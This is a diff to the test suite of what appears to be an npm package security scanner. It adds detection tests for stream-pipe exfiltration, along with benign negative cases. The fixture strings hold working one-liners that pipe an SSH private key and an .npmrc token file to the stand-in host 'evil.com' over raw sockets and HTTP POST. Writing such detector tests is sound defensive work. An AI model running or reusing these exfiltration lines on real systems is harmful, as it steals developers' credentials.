@@ -34,6 +34,53 @@ async function runDataflowTests() {
     } finally { cleanupTemp(tmp); }
   });
 
+  // --- Stream-pipe exfiltration: createReadStream(<sensitive>).pipe(<network sink>) ---
+  // Closes the gap where the SAME exfil scored 89 (readFileSync + socket.write) but only
+  // 9 (sensitive_string) when written as a stream pipe. createReadStream is now a
+  // credential_read source when its path is sensitive; the network sink inside .pipe()
+  // was already detected, so the co-occurrence fires suspicious_dataflow. FP-measured
+  // 0 new flags across 745 benign packages (createReadStream of a sensitive path is
+  // absent from legitimate code; .pipe(res)/.pipe(createWriteStream) are not network sinks).
+
+  await asyncTest('DATAFLOW STREAM-PIPE: createReadStream(.ssh) piped to net.connect → suspicious_dataflow', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst net = require('net');\nfs.createReadStream('/home/user/.ssh/id_rsa').pipe(net.connect(1234, 'evil.com'));`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('createReadStream'));
+      assert(t, 'Stream-piped SSH key to a socket must be a suspicious_dataflow');
+      assert(t.severity === 'CRITICAL', `sensitive source + network sink on the same line is CRITICAL, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW STREAM-PIPE: createReadStream(.npmrc) two-step pipe to http.request → suspicious_dataflow', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst http = require('http');\nconst { Transform } = require('stream');\nconst x = new Transform({ transform(c, e, cb) { cb(null, c); } });\nfs.createReadStream('.npmrc').pipe(x).pipe(http.request({ hostname: 'evil.com', method: 'POST' }));`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('createReadStream'));
+      assert(t, 'Two-step stream pipe of .npmrc to http.request must be a suspicious_dataflow');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW STREAM-PIPE (neg): createReadStream(non-sensitive).pipe(res) → NOT flagged (static file server)', async () => {
+    // The measured FP landmine (119 benign occurrences): a server streaming a public
+    // file to the HTTP response. Non-sensitive source + response sink → nothing.
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst http = require('http');\nhttp.createServer((req, res) => { fs.createReadStream('public/index.html').pipe(res); }).listen(3000);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, `serving a public file over the response is not exfil, got ${t ? t.message : ''}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW STREAM-PIPE (neg): createReadStream(non-sensitive).pipe(createWriteStream) → NOT flagged (local copy)', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nfs.createReadStream('input.txt').pipe(fs.createWriteStream('output.txt'));`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, `a local file copy is not exfil, got ${t ? t.message : ''}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
   // --- .secretKey / .privateKey credential source ---
 
   await asyncTest('DATAFLOW: Detects .secretKey property as credential source', async () => {
